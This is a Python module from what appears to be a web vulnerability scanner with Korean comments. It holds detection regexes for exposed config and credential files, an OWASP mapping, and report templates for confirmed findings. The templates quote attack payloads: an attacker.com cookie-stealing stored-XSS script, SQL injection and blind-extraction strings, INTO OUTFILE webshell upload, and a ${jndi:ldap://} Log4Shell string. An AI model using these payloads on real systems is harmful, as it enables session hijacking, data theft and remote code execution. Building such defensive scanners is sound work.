import logging
import re
import urllib.parse
import yaml

_LOG = logging.getLogger(__name__)
from pathlib import Path

# 관리자 경로: 401(인증 필요)도 노출로 보고, 403(접근 거부)은 보호됨으로 스킵
_ADMIN_PATH_RE = re.compile(
    r"(/admin|/administrator|/wp-admin|/phpmyadmin|/phpMyAdmin|/manager|/console|/dashboard|/panel)",
    re.IGNORECASE,
)

# 설정 파일 경로: 200 응답에서 실제 파일 내용이 있어야만 보고
_CONFIG_FILE_RE = re.compile(
    r"(\.env|\.env\.|wp-config|config\.php|config\.yml|\.htaccess|\.htpasswd|"
    r"\.git/config|\.git/HEAD|database\.yml|credentials\.json|settings\.py|web\.config)",
    re.IGNORECASE,
)

# 설정 파일 내용 검증 패턴 (이 패턴이 body에 있어야 실제 파일 노출로 판단)
_CONFIG_CONTENT_RE = re.compile(
    r"([A-Z_]{3,}=.{2,}|"               # KEY=value (.env)
    r"\[core\]|\[remote\s|repositoryformatversion|"  # .git/config
    r"DB_NAME|DB_USER|DB_PASS|define\s*\(|"          # wp-config
    r"RewriteEngine|AllowOverride|Deny from|"         # .htaccess
    r"-----BEGIN|PRIVATE KEY|"                         # private keys
    r"password\s*[=:]\s*\S|secret\s*[=:]\s*\S|api.?key\s*[=:]\s*\S)",  # generic secrets
    re.IGNORECASE | re.MULTILINE,
)

_OWASP_MAPPING: dict[str, str] = {
    "xss_reflected":          "A03:2021 - 인젝션",
    "xss_stored":             "A03:2021 - 인젝션",
    "xss_js_context":         "A03:2021 - 인젝션",
    "xss_attr_context":       "A03:2021 - 인젝션",
    "sql_injection":          "A03:2021 - 인젝션",
    "sql_injection_blind":    "A03:2021 - 인젝션",
    "no_bruteforce_protection": "A07:2021 - 식별 및 인증 실패",
    "sqli_auth_bypass":       "A03:2021 - 인젝션",
    "csrf":                   "A01:2021 - 접근 제어 취약점",
    "csrf_form":              "A01:2021 - 접근 제어 취약점",
    "idor":                   "A01:2021 - 접근 제어 취약점",
    "idor_candidate":         "A01:2021 - 접근 제어 취약점",
    "csrf_candidate":         "A01:2021 - 접근 제어 취약점",
    "business_logic_candidate": "A04:2021 - 안전하지 않은 설계",
    "file_upload_candidate":  "A04:2021 - 안전하지 않은 설계",
    "lfi":                    "A01:2021 - 접근 제어 취약점",
    "cmd_injection":          "A03:2021 - 인젝션",
    "sqli_oob":               "A03:2021 - 인젝션",
    "jndi":                   "A03:2021 - 인젝션",
    "ssti":                   "A03:2021 - 인젝션",
    "ssrf":                   "A10:2021 - 서버사이드 요청 위조",
    "xxe":                    "A05:2021 - 보안 설정 오류",
    "open_redirect":          "A01:2021 - 접근 제어 취약점",
    "cors":                   "A05:2021 - 보안 설정 오류",
    "crlf":                   "A03:2021 - 인젝션",
    "dom_xss":                "A03:2021 - 인젝션",
    "jwt":                    "A07:2021 - 식별 및 인증 실패",
    "nosql_injection":        "A03:2021 - 인젝션",
    "deserialization":        "A08:2021 - 소프트웨어 및 데이터 무결성 실패",
    "api_audit":              "A04:2021 - 안전하지 않은 설계",
    "file_upload":            "A04:2021 - 안전하지 않은 설계",
    "auth_bypass":            "A01:2021 - 접근 제어 취약점",
    "js_secrets":             "A02:2021 - 암호화 오류",
    "vim_swp":                "A05:2021 - 보안 설정 오류",
    "email_header_injection": "A03:2021 - 인젝션",
    # Phase 2
    "clickjacking":            "A05:2021 - 보안 설정 오류",
    "swagger_openapi":         "A05:2021 - 보안 설정 오류",
    "graphql_introspection":   "A05:2021 - 보안 설정 오류",
    "spring_actuator":         "A05:2021 - 보안 설정 오류",
    "source_map":              "A05:2021 - 보안 설정 오류",
    "backup_file":             "A05:2021 - 보안 설정 오류",
    "csp_bypass":              "A05:2021 - 보안 설정 오류",
    # check_type mappings for passive rules
    "directory_indexing":     "A05:2021 - 보안 설정 오류",
    "error_page_leakage":     "A05:2021 - 보안 설정 오류",
    "error_info_disclosure":  "A05:2021 - 보안 설정 오류",
    "server_version":         "A05:2021 - 보안 설정 오류",
    "sensitive_path":         "A05:2021 - 보안 설정 오류",
    "dangerous_methods":      "A05:2021 - 보안 설정 오류",
    "http_plaintext":         "A02:2021 - 암호화 오류",
    # Phase 6 신규
    "admin_panel":            "A05:2021 - 보안 설정 오류",
    "admin_api":              "A01:2021 - 접근 제어 취약점",
    "framework_info":         "A05:2021 - 보안 설정 오류",
    "user_enumeration":       "A07:2021 - 식별 및 인증 실패",
    # 고도화A
    "clientside_guard_bypass": "A04:2021 - 안전하지 않은 설계",
    "js_auth_token":          "A07:2021 - 식별 및 인증 실패",
    "jsonp_misuse":           "A05:2021 - 보안 설정 오류",
    "token_in_url":           "A05:2021 - 보안 설정 오류",
    "unauth_privileged_content": "A01:2021 - 접근 제어 취약점",
    "unauth_write_bac": "A01:2021 - 접근 제어 취약점",
    "react2shell": "A08:2021 - 소프트웨어·데이터 무결성 실패(안전하지 않은 역직렬화)",
    "cve_exposure": "A06:2021 - 취약하고 오래된 요소",
    "api_json_injection":     "A03:2021 - 인젝션",
    "graphql_injection":      "A03:2021 - 인젝션",
    "graphql_dos":            "A04:2021 - 안전하지 않은 설계",
    "graphql_field_suggestion": "A05:2021 - 보안 설정 오류",
    "graphql_directive_overload": "A04:2021 - 안전하지 않은 설계",
    "jwt_alg_none":           "A07:2021 - 식별 및 인증 실패",
    "jwt_alg_confusion":      "A07:2021 - 식별 및 인증 실패",
    "session_fixation":       "A07:2021 - 식별 및 인증 실패",
    "weak_session_id":        "A07:2021 - 식별 및 인증 실패",
    "logout_invalidation":    "A07:2021 - 식별 및 인증 실패",
    "session_timeout":        "A07:2021 - 식별 및 인증 실패",
    "session_idle_timeout":   "A07:2021 - 식별 및 인증 실패",
    "grpc_web_service":       "A05:2021 - 보안 설정 오류",
    "h2c_smuggling":          "A05:2021 - 보안 설정 오류",
}

_RULES_PATH = Path(__file__).parent / "rules.yaml"
_rules_cache: list[dict] | None = None
_rules_mtime: float | None = None


def load_rules() -> list[dict]:
    global _rules_cache, _rules_mtime
    mtime = _RULES_PATH.stat().st_mtime
    if _rules_cache is None or _rules_mtime != mtime:
        with open(_RULES_PATH, encoding="utf-8") as f:
            data = yaml.safe_load(f)
        _rules_cache = data.get("rules", [])
        _rules_mtime = mtime
    return _rules_cache


def reload_rules() -> list[dict]:
    global _rules_cache, _rules_mtime
    _rules_cache = None
    _rules_mtime = None
    return load_rules()


# ── Rule check + evidence collection ─────────────────────────────────────────

def _check_rule_with_evidence(rule: dict, service: dict) -> tuple[bool, dict]:
    """Returns (triggered, evidence_dict). evidence_dict is {} if not triggered."""
    ct = rule.get("check_type")
    http = service.get("http_info") or {}
    base_url = http.get("url", "")

    if ct == "directory_indexing":
        triggered = bool(http.get("directory_indexing"))
        if not triggered:
            return False, {}
        return True, {
            "evidence_url": base_url,
            "detection_steps": [
                f"GET {base_url} 요청 전송",
                f"HTTP {http.get('status', '')} 응답 수신",
                "응답 본문에서 'Index of /' 문자열 발견",
                "웹 서버가 디렉터리 내 파일 목록을 그대로 노출함을 확인",
            ],
            "evidence_detail": "서버 응답 본문에 디렉터리 목록(Index of /)이 포함됨\n→ 백업 파일·설정 파일 직접 다운로드 가능",
        }

    elif ct == "error_page_leakage":
        error_info = service.get("error_page_info")
        triggered = bool(error_info)
        if not triggered:
            return False, {}
        probe_url = base_url.rstrip("/") + "/xk9q2m7_scanner_probe_404"
        leak_label = {
            "stack_trace": "스택 트레이스 노출",
            "version_in_body": "소프트웨어 버전 정보 노출",
            "path_disclosure": "서버 경로(절대 경로) 노출",
            "db_error": "DB 엔진 오류 메시지 노출(DBMS 종류·구조 힌트)",
        }
        leaks = [leak_label.get(l, l) for l in (error_info.get("leaks") or [])]
        leak_str = ", ".join(leaks) if leaks else "민감 정보"
        return True, {
            "evidence_url": probe_url,
            "detection_steps": [
                f"존재하지 않는 경로 GET {probe_url} 요청",
                f"HTTP {error_info.get('status_code', 404)} 에러 응답 수신",
                f"에러 페이지 본문 분석 → 민감 정보 발견: {leak_str}",
            ],
            "evidence_detail": f"에러 페이지 노출 항목: {leak_str}",
        }

    elif ct == "server_version":
        server = http.get("server", "") or ""
        xpb = http.get("x_powered_by", "") or ""
        triggered = bool(re.search(r"[\d.]{3,}", server) or re.search(r"[\d.]{3,}", xpb))
        if not triggered:
            return False, {}
        lines = []
        if re.search(r"[\d.]{3,}", server):
            lines.append(f"Server: {server}")
        if re.search(r"[\d.]{3,}", xpb):
            lines.append(f"X-Powered-By: {xpb}")
        # Apache-Coyote/1.1 은 Tomcat 커넥터 시그니처 — 제품/버전 단정 금지, '가능성'으로만 표기.
        notes = []
        if re.search(r"coyote", server, re.IGNORECASE):
            notes.append("Apache-Coyote/1.1 → Apache Tomcat '가능성' (직접 버전 확인 전 단정·CVE 매핑 금지)")
        return True, {
            "evidence_url": base_url,
            "detection_steps": [
                f"GET {base_url} 요청 전송",
                "HTTP 응답 헤더 분석",
                f"버전 정보가 포함된 헤더 발견: {', '.join(lines)}",
            ] + ([f"비고: {notes[0]}"] if notes else []),
            "evidence_detail": "\n".join(lines + notes),
        }

    elif ct == "sensitive_path":
        rule_paths = set(rule.get("paths", []))
        for p in (service.get("sensitive_paths") or []):
            if p.get("path") not in rule_paths:
                continue
            status = p.get("status")
            path = p.get("path", "")
            preview = p.get("body_preview", "")
            path_url = base_url.rstrip("/") + path

            # 403 = 서버가 직접 접근 차단 중 → 취약점 아님
            if status == 403:
                continue

            # 401 = 인증 필요 → 관리자 페이지만 보고 (설정 파일은 401도 보호된 것)
            if status == 401:
                if not _ADMIN_PATH_RE.search(path):
                    continue

            # 200 = 실제 응답 수신
            elif status == 200:
                # 설정 파일은 body에 실제 파일 내용이 있어야만 보고
                if _CONFIG_FILE_RE.search(path):
                    if not preview or not _CONFIG_CONTENT_RE.search(preview):
                        continue
            else:
                continue

            steps = [
                f"[1단계] 민감 경로 점검 목록에 '{path}' 포함",
                f"[2단계] GET {path_url} 요청 전송",
                f"[3단계] HTTP {status} 응답 수신",
            ]
            detail = f"HTTP {status}"

            if status == 200 and preview:
                steps.append(f"[4단계] 응답 본문 확인 — 민감 내용 노출")
                steps.append(f"[결론] curl \"{path_url}\" 으로 재현 가능")
                detail += f" — 파일 내용 직접 노출\n\n[응답 내용]\n{preview[:400]}"
            elif status == 401:
                steps.append("[결론] 관리자 인터페이스가 외부에서 접근 가능 (인증 우회 공격 표적)")
                detail += " — 관리자 페이지 외부 노출 (인증 필요)"
            else:
                steps.append(f"[결론] curl \"{path_url}\" 으로 재현 가능")
                detail += " — 외부에서 직접 접근 가능"

            return True, {
                "evidence_url": path_url,
                "detection_steps": steps,
                "evidence_detail": detail,
            }
        return False, {}

    elif ct == "missing_header":
        # 헤더 부재는 설정 권고 사항이며, 스크린샷·데이터로 실제 exploit을 증명할 수 없음
        # (CSP 부재 → XSS가 실제로 발생해야 증명, X-Frame-Options 부재 → clickjacking PoC 필요)
        return False, {}

    elif ct == "cookie_flag":
        # 쿠키 플래그 부재는 실제 세션 탈취 성공 여부를 스크린샷으로 직접 증명할 수 없음
        # (missing_header와 동일 사유 — 실증 없이 보고하지 않음)
        return False, {}

    elif ct == "dangerous_methods":
        dangerous = {m.upper() for m in rule.get("dangerous", [])}
        allowed = {m.strip().upper() for m in (service.get("allowed_methods") or [])}
        # Allow 헤더에 나열된 것만으로는 판정하지 않는다.
        # scanner가 실제 호출로 동작을 확인한 메서드(verified_dangerous_methods)만 취약으로 인정.
        verified = {m.strip().upper() for m in (service.get("verified_dangerous_methods") or [])}
        found = dangerous & verified
        if not found:
            return False, {}
        method_tests = "; ".join(
            f"{m}: 실제 호출 시 정상 처리됨(TRACE는 요청 반사)" for m in sorted(found)
        )
        return True, {
            "evidence_url": base_url,
            "detection_steps": [
                f"OPTIONS {base_url} 요청 전송 → Allow 헤더 수신: {', '.join(sorted(allowed))}",
                f"광고된 위험 메서드를 실제 호출하여 동작 검증 ({', '.join(sorted(dangerous & allowed)) or '없음'})",
                f"실제 활성화 확인된 위험 메서드: {', '.join(sorted(found))}",
            ],
            "evidence_detail": (
                f"서버 광고 메서드(Allow): {', '.join(sorted(allowed))}\n"
                f"실제 동작 검증된 위험 메서드: {', '.join(sorted(found))}\n"
                f"검증 내역: {method_tests}"
            ),
        }

    elif ct == "http_plaintext":
        port = service.get("port")
        if port not in (80, 8080, 8000, 8008, 8888):
            return False, {}
        # B3: 이미 TLS 로 제공 중인 서비스(비표준 포트 HTTPS 등)는 평문 아님 → 오탐 방지
        if service.get("ssl_info") or str(http.get("url", "")).lower().startswith("https"):
            return False, {}
        if http.get("redirects_to_https", False):
            return False, {}
        # 로그인 폼 또는 쿠키가 있을 때만 실질적 데이터 노출 위험으로 판단
        cookies = http.get("cookies", [])
        has_login = http.get("has_login_form", False)
        if not cookies and not has_login:
            return False, {}
        # A3: 세션/인증 쿠키만 '세션 쿠키'로 표기(→ CONFIRMED 승격 근거). 비세션 쿠키는 평문 노출(POSSIBLE 유지).
        _sess_re = re.compile(
            r"(sessionid|jsessionid|phpsessid|aspsessionid|asp\.net_sessionid|session|_sess|"
            r"^sid$|csrftoken|auth|token|jwt|access|refresh|remember|login)", re.IGNORECASE)
        session_cookies = [c["name"] for c in cookies if c.get("name") and _sess_re.search(c["name"])]
        other_cookies = [c["name"] for c in cookies if c.get("name") and not _sess_re.search(c["name"])]
        reason_parts = []
        if has_login:
            reason_parts.append("로그인 폼이 HTTP 평문으로 전송됨 (아이디·비밀번호 노출 위험)")
        if session_cookies:
            reason_parts.append(f"세션 쿠키({', '.join(session_cookies)})가 HTTP로 전송됨")
        elif other_cookies:
            reason_parts.append(f"쿠키({', '.join(other_cookies)})가 HTTP로 전송됨(비세션)")
        reason = "; ".join(reason_parts)
        return True, {
            "evidence_url": base_url,
            "detection_steps": [
                f"[1단계] GET {base_url} 요청 전송 (HTTP 평문 연결)",
                f"[2단계] HTTP {http.get('status', '')} 응답 수신 — HTTPS 리다이렉트 없음",
                f"[3단계] {reason}",
                f"[재현] Wireshark로 포트 {port} 트래픽 캡처 시 자격증명/쿠키 평문 확인 가능",
                f"[결론] 동일 네트워크 MITM 공격으로 데이터 탈취 가능",
            ],
            "evidence_detail": (
                f"HTTP {http.get('status', '')} 응답 — HTTPS 미적용\n"
                f"위험 근거: {reason}\n"
                f"접속 URL: {base_url}"
            ),
        }

    return False, {}


# ── Active probe → Finding 매핑 테이블 ──────────────────────────────────────────

# template 없이도 정상인 probe 키(main.py 에서 별도 집계). 이 목록에 없고 '_' 접두도 아닌
# 미지의 키가 template 없이 등장하면 orphan 경고를 남긴다(계약 정리 — 조용한 유실 방지).
_PROBE_KEYS_HANDLED_ELSEWHERE = {"login_sqli", "csrf_dynamic"}

_ACTIVE_PROBE_TEMPLATES: dict[str, dict] = {
    "xss_reflected": {
        "id": "WEB-XS-ACTIVE-REF",
        "category": "크로스사이트 스크립팅",
        "cwe": "CWE-79",
        "kisa_category": "XSS",
        "business_impact": "세션 쿠키 탈취를 통한 계정 하이재킹, 피싱 페이지 삽입, 관리자 권한 탈취 가능",
        "severity": "HIGH",
        "cvss_estimate": "8.0",
        "exploitation_difficulty": "Easy",
        "title": "반사형 XSS (Reflected XSS) 실증 확인",
        "description": (
            "사용자 입력값이 서버에서 HTML 인코딩 없이 그대로 응답에 반사되어 "
            "JavaScript가 실행됩니다. Playwright 브라우저에서 alert() 실제 발생으로 확인되었습니다."
        ),
        "attack_vector": (
            "파라미터에 <script>alert()</script> 삽입 → 페이지 렌더링 시 실행. "
            "세션 쿠키 탈취, 피싱 페이지 삽입, 사용자 행위 조작 등에 악용됩니다."
        ),
        "attack_scenario": (
            "1. 취약한 파라미터에 XSS 페이로드 삽입\n"
            "2. 악성 URL을 피해자에게 전송\n"
            "3. 피해자 클릭 시 브라우저에서 스크립트 실행\n"
            "4. document.cookie로 세션 쿠키 탈취 → 세션 하이재킹"
        ),
        "tools": ["burpsuite", "dalfox", "xsstrike"],
        "cve_references": [],
        "lab_guide": "DVWA XSS (Reflected) 모듈 또는 PortSwigger Web Academy XSS Labs",
        "recommendation": (
            "모든 사용자 입력값을 HTML 엔티티로 인코딩하세요. "
            "Content-Security-Policy 헤더를 설정하고, "
            "X-XSS-Protection: 1; mode=block 헤더를 추가하세요."
        ),
    },
    "xss_stored": {
        "id": "WEB-XS-ACTIVE-STO",
        "category": "크로스사이트 스크립팅",
        "cwe": "CWE-79",
        "kisa_category": "XSS",
        "business_impact": "세션 쿠키 탈취를 통한 계정 하이재킹, 피싱 페이지 삽입, 관리자 권한 탈취 가능",
        "severity": "HIGH",
        "cvss_estimate": "9.0",
        "exploitation_difficulty": "Medium",
        "title": "저장형 XSS (Stored XSS) 실증 확인",
        "description": (
            "악의적인 스크립트가 DB에 저장되어 페이지를 방문하는 모든 사용자에게 실행됩니다. "
            "Playwright 브라우저에서 alert() 실제 발생으로 확인되었습니다."
        ),
        "attack_vector": (
            "게시판, 댓글, 프로필 등 입력 필드에 스크립트 저장 → "
            "해당 페이지 방문자 모두에게 실행. 반사형 XSS보다 위험도가 높습니다."
        ),
        "attack_scenario": (
            "1. 게시판/댓글에 <script>document.location='http://attacker.com/?c='+document.cookie</script> 저장\n"
            "2. 관리자 포함 모든 방문자 접속 시 스크립트 실행\n"
            "3. 세션 쿠키 공격자 서버로 전송\n"
            "4. 관리자 세션 탈취 → 서버 완전 장악"
        ),
        "tools": ["burpsuite", "dalfox", "xsstrike"],
        "cve_references": [],
        "lab_guide": "DVWA XSS (Stored) 모듈 또는 PortSwigger Web Academy Stored XSS Labs",
        "recommendation": "입력값 저장 시 서버사이드 필터링, 출력 시 HTML 엔티티 인코딩을 반드시 적용하세요.",
    },
    "xss_js_context": {
        "id": "WEB-XS-ACTIVE-JS",
        "category": "크로스사이트 스크립팅",
        "cwe": "CWE-79",
        "kisa_category": "XSS",
        "business_impact": "세션 쿠키 탈취를 통한 계정 하이재킹, 피싱 페이지 삽입, 관리자 권한 탈취 가능",
        "severity": "HIGH",
        "cvss_estimate": "8.0",
        "exploitation_difficulty": "Medium",
        "title": "반사형 XSS (JS 컨텍스트) 실증 확인",
        "description": (
            "사용자 입력값이 인라인 <script> 블록의 JavaScript 문자열/코드 컨텍스트로 반사되며, "
            "구분 따옴표가 인코딩되지 않아 문자열을 탈출해 임의 코드가 실행됩니다. "
            "HTML 태그(<,>) 인코딩만 적용된 사이트에서도 성립하는, HTML 페이로드로는 탐지되지 않는 XSS 클래스입니다."
        ),
        "attack_vector": (
            "<script> 내부로 반사되는 파라미터에 따옴표/스크립트 종료 페이로드 삽입 → "
            "문자열 탈출 후 alert()/쿠키 탈취 코드 실행."
        ),
        "attack_scenario": (
            "1. <script> JS 문자열로 반사되는 파라미터 식별\n"
            "2. 따옴표 미인코딩을 이용해 문자열 컨텍스트 탈출\n"
            "3. document.cookie 전송 코드 주입 → 세션 하이재킹"
        ),
        "tools": ["burpsuite", "dalfox", "xsstrike"],
        "cve_references": [],
        "lab_guide": "PortSwigger Web Academy — XSS in JavaScript string context",
        "recommendation": (
            "JS 컨텍스트로 출력하는 값은 JavaScript 문자열 이스케이프(\\uXXXX) 또는 JSON.stringify 를 "
            "적용하고, HTML 인코딩만으로는 JS 문자열 컨텍스트를 방어할 수 없음에 유의하세요. CSP 병행."
        ),
    },
    "xss_attr_context": {
        "id": "WEB-XS-ACTIVE-ATTR",
        "category": "크로스사이트 스크립팅",
        "cwe": "CWE-79",
        "kisa_category": "XSS",
        "business_impact": "세션 쿠키 탈취를 통한 계정 하이재킹, 피싱 페이지 삽입, 관리자 권한 탈취 가능",
        "severity": "HIGH",
        "cvss_estimate": "7.5",
        "exploitation_difficulty": "Medium",
        "title": "반사형 XSS (HTML 속성 컨텍스트) 실증 확인",
        "description": (
            "사용자 입력값이 따옴표로 감싼 HTML 속성값 안으로 반사되며, 구분 따옴표(' 또는 \")가 "
            "인코딩되지 않아 속성값을 탈출해 이벤트 핸들러(onmousemove/onfocus)를 주입할 수 있습니다. "
            "<,> 가 인코딩되어 새 태그 삽입이 막혀도 성립하는 XSS 클래스입니다."
        ),
        "attack_vector": (
            "속성값으로 반사되는 파라미터에 구분 따옴표 + autofocus/onmousemove 페이로드 삽입 → "
            "기존 태그에 이벤트 핸들러 주입, 사용자 상호작용/자동화 봇에서 실행."
        ),
        "attack_scenario": (
            "1. <tag attr='<반사>'> 형태로 반사되는 파라미터 식별\n"
            "2. 구분 따옴표 미인코딩으로 속성값 탈출\n"
            "3. autofocus+onfocus/onmousemove 핸들러 주입 → 자동 실행 → 세션 탈취"
        ),
        "tools": ["burpsuite", "dalfox", "xsstrike"],
        "cve_references": [],
        "lab_guide": "PortSwigger Web Academy — XSS in HTML attribute context",
        "recommendation": (
            "속성값 출력 시 따옴표를 포함한 모든 특수문자를 HTML 엔티티로 인코딩하고, 속성은 항상 "
            "따옴표로 감싸세요. 이벤트 핸들러 속성 삽입을 막기 위한 CSP 를 병행하세요."
        ),
    },
    "sqli_oob": {
        "id": "WEB-GI-SQLI-OOB",
        "category": "SQL 인젝션 (Out-of-Band)",
        "cwe": "CWE-89",
        "kisa_category": "데이터베이스 인젝션",
        "business_impact": "blind SQL 인젝션이 OOB 콜백으로 확증됨 — 데이터베이스 조작·정보 유출 가능",
        "severity": "HIGH",
        "cvss_estimate": "9.1",
        "exploitation_difficulty": "Medium",
        "title": "OOB SQL 인젝션 실증 확인",
        "description": ("파라미터 주입으로 데이터베이스가 스캐너 콜라보레이터에 네트워크 콜백을 보냈습니다. "
                        "응답에 직접 드러나지 않는 blind SQL 인젝션을 대역 외(out-of-band) 채널로 확증했습니다."),
        "attack_vector": "파라미터에 DB 네트워크 함수(예: UTL_HTTP) 주입 → DB 가 외부로 요청 → 콜백 수신으로 실증.",
        "attack_scenario": ("1. 파라미터에 OOB 페이로드 삽입\n2. DB 가 스캐너 콜백 URL 로 HTTP 요청\n"
                            "3. 콜백 수신 = SQL 인젝션 실행 확증(데이터 추출 없이)"),
        "recommendation": "파라미터화 쿼리/Prepared Statement 적용, DB 계정의 외부 네트워크·위험 함수 권한 제거.",
    },
    "jndi": {
        "id": "WEB-GI-JNDI-OOB",
        "category": "JNDI 인젝션 / Log4Shell (원격 코드 실행)",
        "cwe": "CWE-502",
        "kisa_category": "서버사이드 코드 실행",
        "business_impact": "JNDI 룩업을 통한 원격 클래스 로딩으로 임의 코드 실행 — 서버 완전 장악(Log4Shell 계열).",
        "severity": "CRITICAL",
        "cvss_estimate": "10.0",
        "exploitation_difficulty": "Low",
        "title": "JNDI/Log4Shell 원격 코드 실행 실증 확인",
        "description": (
            "HTTP 헤더/파라미터에 주입한 JNDI 룩업 문자열(${jndi:ldap://…})을 서버(JVM)가 해석해 "
            "스캐너 raw-TCP 캐처로 LDAP 연결을 시도했습니다. 취약한 로깅/역직렬화 경로(Log4Shell 계열)로 "
            "원격 클래스가 로딩되면 인증 없이 임의 코드가 실행됩니다."
        ),
        "attack_vector": (
            "User-Agent 등 로그에 기록되는 헤더나 파라미터에 ${jndi:ldap://공격자/x} 주입 → JVM 이 "
            "해당 LDAP/RMI 로 접속 → 원격 악성 클래스 로딩 → 원격 코드 실행."
        ),
        "attack_scenario": (
            "1. 헤더/파라미터에 JNDI 룩업 페이로드 주입(난독화 변형 포함)\n"
            "2. 서버 JVM 이 스캐너 raw-TCP 캐처로 LDAP 연결(포트=토큰으로 정확 상관)\n"
            "3. 콜백 수신 = 코드 실행 경로 확증(셸/데이터 추출 없이)\n"
            "4. 실 공격 시 원격 클래스 로딩 → 임의 명령 실행 → 서버 완전 장악"
        ),
        "tools": ["log4j-scan", "interactsh", "marshalsec"],
        "cve_references": ["CVE-2021-44228", "CVE-2021-45046"],
        "lab_guide": "PortSwigger/TryHackMe Log4Shell, log4shell 취약 라이브러리 실습",
        "recommendation": (
            "Log4j 2.17.1+ 등 패치 버전으로 즉시 업그레이드, log4j2.formatMsgNoLookups=true 및 "
            "JndiLookup 클래스 제거, JVM 의 외부 LDAP/RMI 아웃바운드 차단, 신뢰 불가 입력의 역직렬화 금지."
        ),
    },
    "sql_injection": {
        "id": "WEB-GI-SQLI-ACTIVE",
        "category": "SQL 인젝션",
        "cwe": "CWE-89",
        "kisa_category": "데이터베이스 인젝션",
        "business_impact": "전체 데이터베이스 덤프, 고객 개인정보 유출, 내부 시스템 접근 가능",
        "severity": "HIGH",
        "cvss_estimate": "9.8",
        "exploitation_difficulty": "Medium",
        "title": "SQL 인젝션 취약점 실증 확인",
        "description": (
            "파라미터를 통해 SQL 쿼리를 조작할 수 있습니다. "
            "DB 에러 노출, UNION SELECT로 데이터 추출, 시간 지연 등으로 확인되었습니다."
        ),
        "attack_vector": (
            "파라미터에 SQL 특수문자(', OR, UNION) 삽입 → DB 쿼리 조작. "
            "전체 DB 덤프, 인증 우회, 파일 읽기/쓰기, OS 명령어 실행 가능."
        ),
        "attack_scenario": (
            "1. 취약 파라미터에 ' OR '1'='1 삽입 → 인증 우회\n"
            "2. UNION SELECT로 users 테이블 덤프\n"
            "3. 패스워드 해시 크래킹 → 관리자 계정 탈취\n"
            "4. INTO OUTFILE로 웹쉘 업로드 → 서버 장악"
        ),
        "tools": ["sqlmap", "burpsuite", "havij"],
        "cve_references": [],
        "lab_guide": "DVWA SQL Injection 모듈, SQLi-labs, PortSwigger SQL Injection Labs",
        "recommendation": (
            "PreparedStatement(파라미터화 쿼리)를 사용하고 ORM을 활용하세요. "
            "DB 계정 최소 권한 원칙을 적용하고, 입력값 화이트리스트 검증을 수행하세요."
        ),
    },
    "sql_injection_blind": {
        "id": "WEB-GI-SQLI-BLIND",
        "category": "블라인드 SQL 인젝션 (데이터 문자단위 추출)",
        "cwe": "CWE-89",
        "kisa_category": "데이터베이스 인젝션",
        "business_impact": "오류·데이터가 화면에 안 보여도 참/거짓 응답만으로 DB 내용을 한 글자씩 열람 — 계정·해시 등 전량 유출 가능",
        "severity": "HIGH",
        "cvss_estimate": "9.8",
        "exploitation_difficulty": "Medium",
        "title": "블라인드 SQL 인젝션 — 데이터 '문자 단위' 추출 실증",
        "description": (
            "응답에 오류나 데이터가 직접 노출되지 않는데도, 참/거짓으로 갈리는 응답 차이(불린 오라클)만 "
            "이용해 서버의 값을 '문자 단위'로 실제 추출했습니다. 각 자리 문자의 ASCII 코드를 이진탐색으로 "
            "좁혀 확정하는 방식으로, 동일 기법을 반복하면 계정·비밀번호 해시 등 임의 데이터까지 열람할 수 "
            "있습니다(읽기전용·비파괴로 실증). 에러/UNION 기반과 달리 화면 노출이 없어 '보이지 않는' SQLi 입니다."
        ),
        "attack_vector": (
            "참 조건(AND 1=1)과 거짓 조건(AND 1=2)의 응답 차이를 오라클 삼아, "
            "ASCII(SUBSTRING((SELECT DATABASE()),i,1)) > mid 형태의 비교로 각 자리 문자를 이진탐색."
        ),
        "attack_scenario": (
            "1. 참/거짓 조건이 서로 다른 응답을 유발함을 확인(불린 오라클 성립)\n"
            "2. i번째 문자의 ASCII 값을 '>mid' 비교로 이진탐색 → 문자 확정\n"
            "3. i를 늘려가며 값 전체(예: DB명)를 한 글자씩 복원\n"
            "4. 대상을 users.password 등으로 바꿔 계정 해시까지 추출 → 크래킹·계정 탈취"
        ),
        "tools": ["sqlmap", "burpsuite"],
        "cve_references": [],
        "lab_guide": "DVWA SQL Injection (Blind) 모듈, PortSwigger Blind SQL Injection Labs",
        "recommendation": (
            "PreparedStatement(파라미터화 쿼리)를 사용하세요. 참/거짓·시간 응답 차이가 새지 않도록 오류·분기 "
            "응답을 일반화하고, DB 계정 최소 권한 원칙과 입력값 화이트리스트 검증을 적용하세요."
        ),
    },
    "csrf_form": {
        "id": "WEB-CSRF-352",
        "category": "크로스사이트 요청 위조 (CSRF) — 토큰 부재",
        "cwe": "CWE-352",
        "kisa_category": "클라이언트사이드 취약점",
        "business_impact": "피해자가 공격 페이지 방문만으로 비밀번호 변경·계정 수정 등 상태변경이 위조 실행됨",
        "severity": "MEDIUM",
        "cvss_estimate": "6.5",
        "exploitation_difficulty": "Low",
        "title": "CSRF 취약점 — 상태변경 폼에 안티-CSRF 토큰 부재",
        "description": ("중요 기능(비밀번호 변경 등)을 수행하는 폼에 anti-CSRF 토큰이 없고, GET 방식이거나 "
                        "세션 쿠키에 SameSite 가 설정되지 않았습니다. 공격자가 만든 페이지를 피해자가 열기만 "
                        "해도 피해자의 인증 상태로 의도치 않은 상태변경이 실행될 수 있습니다. (비파괴 원칙상 "
                        "실제 값 변경은 하지 않고 폼 구조로 확증했습니다.)"),
        "attack_vector": ("공격자 페이지에 대상 폼과 동일한 요청(링크/이미지/자동제출 폼)을 배치 → 로그인된 "
                          "피해자가 방문 → 피해자 쿠키로 상태변경 요청 전송."),
        "attack_scenario": ("1. 공격자가 대상의 상태변경 요청을 그대로 담은 HTML(PoC) 배치\n"
                            "2. 로그인된 피해자가 그 페이지 방문\n"
                            "3. 토큰 검증이 없어 요청 수락 → 비밀번호 변경 등 실행"),
        "tools": ["burpsuite", "owasp-zap"],
        "cve_references": [],
        "lab_guide": "OWASP CSRF Prevention / PortSwigger CSRF labs",
        "recommendation": ("상태변경 요청에 예측 불가한 anti-CSRF 토큰을 발급·검증하세요. 상태변경은 GET 대신 "
                           "POST 로 처리하고, 세션 쿠키에 SameSite=Lax/Strict 를 설정하며, 중요 작업은 재인증을 요구하세요."),
    },
    "no_bruteforce_protection": {
        "id": "WEB-AUTH-307",
        "category": "무차별 대입(브루트포스) 방어 부재 — 시도 횟수 임계치 없음",
        "cwe": "CWE-307",
        "kisa_category": "인증 및 세션 관리",
        "business_impact": "로그인/인증번호 시도 횟수 제한이 없어, 공격자가 무제한 대입으로 비밀번호·OTP 를 알아내 계정을 탈취할 수 있음",
        "severity": "MEDIUM",
        "cvss_estimate": "7.5",
        "exploitation_difficulty": "Low",
